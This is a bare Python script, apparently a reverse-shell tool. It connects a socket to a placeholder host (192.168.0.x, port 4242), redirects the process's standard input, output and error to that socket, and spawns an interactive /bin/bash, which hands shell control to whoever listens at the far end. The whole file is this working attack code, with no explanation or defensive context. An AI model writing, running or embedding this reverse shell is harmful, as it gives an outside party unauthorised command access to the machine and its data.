import socket
import subprocess
import os
import pty


def shtty(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)

    pty.spawn("/bin/bash")


if __name__ == "__main__":
    HOST = "192.168.0.x"
    PORT = 4242
    shtty(HOST, PORT)

